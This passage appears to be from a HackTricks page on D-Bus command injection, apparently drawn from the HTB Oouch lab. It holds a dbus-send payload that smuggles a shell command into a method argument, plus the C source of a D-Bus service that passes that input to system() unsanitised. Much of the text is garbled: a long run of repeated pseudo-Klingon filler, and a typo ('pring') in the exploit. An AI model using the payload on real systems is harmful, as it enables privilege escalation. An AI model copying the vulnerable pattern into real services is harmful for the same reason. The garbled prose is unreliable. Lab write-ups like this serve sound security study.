Pour trouver des vulnérabilités d'injection de commandes D-Bus, vous pouvez utiliser des outils d'analyse de sécurité tels que dbus-monitor pour surveiller les messages D-Bus échangés sur le système. Cela peut vous aider à identifier les objets D-Bus vulnérables et les méthodes qui peuvent être exploitées pour l'injection de commandes.

Une fois que vous avez identifié une vulnérabilité d'injection de commandes D-Bus, vous pouvez utiliser dbus-send pour exploiter la vulnérabilité et exécuter des commandes avec les privilèges associés à l'objet D-Bus vulnérable.
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send` jenpu'wI' 'e' vItlhutlh "Message Bus" vItlhutlh
* Message Bus - ngeD 'ej vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e'
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

## References
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
